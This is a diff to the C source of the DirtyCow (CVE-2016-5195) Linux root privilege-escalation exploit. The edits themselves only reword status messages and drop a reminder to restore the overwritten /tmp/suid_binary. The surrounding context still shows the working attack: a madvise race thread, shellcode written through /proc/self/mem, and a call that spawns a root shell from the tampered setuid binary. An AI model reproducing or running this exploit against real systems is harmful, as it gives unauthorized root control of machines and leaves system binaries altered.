@@ -47,7 +47,7 @@ void *madviseThread(void *arg)
     for(i=0;i<1000000 && !stop;i++) {
         c+=madvise(map,100,MADV_DONTNEED);
     }
-    printf("thread stopped\n");
+    printf("madvise thread stopped\n");
 }
 
 void *procselfmemThread(void *arg)
@@ -60,7 +60,7 @@ void *procselfmemThread(void *arg)
         lseek(f,(off_t)map,SEEK_SET);
         c+=write(f, str, shellcode_len);
     }
-    printf("thread stopped\n");
+    printf("procselfmem thread stopped\n");
 }
 
 void *waitForWrite(void *arg) {
@@ -83,15 +83,14 @@ void *waitForWrite(void *arg) {
 
     stop = 1;
 
-    printf("Popping root shell\n");
-    printf("Don't forget to restore /tmp/suid_binary\n");
+    printf("\n[*] Popping root shell\n");
 
     system(suid_binary);
 }
 
 int main(int argc,char *argv[]) 
 {
-    printf("DirtyCow root privilege escalation\n");
+    printf("DirtyCow (CVE-2016-5195) root privilege escalation\n");
     /*
     * Steps:
     * 1. Get the size of the suid_binary and make a backup.
